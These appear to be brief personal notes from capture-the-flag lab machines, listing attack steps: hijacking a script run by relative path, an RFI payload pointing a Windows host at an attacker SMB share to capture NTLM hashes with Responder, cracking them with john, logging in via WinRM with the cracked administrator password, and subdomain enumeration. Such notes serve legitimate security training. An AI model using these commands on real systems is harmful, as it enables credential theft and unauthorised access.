1. From machine `Busqueda`. Look for version vulnerability, Space is denoded by "%2b", Look at git configs they might have configs, in python code, the code ran "./full-checkup.sh" while taking "full-checkup", so i could git clone in seperate directory, change full-checkup.sh and ran my own code.

2. When there is rfi, we could ask the vulnerable windows machine to get smb share file, and then catch NTLM hash and crack it.
3. `sudo python Responder.py -I tun0`
4. example `?page=//10.10.14.22/somefile`
5. After u get the hash `username:...`, copy entiner stuff in file, and crack `john -w=/usr/share/wordlists/rockyou.txt hash.txt` 
6. connect to windows remote management `vil-winrm -i 10.129.101.119 -u administrator -p badminton`
7. subdomain enumeration `gobuster vhost -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb`
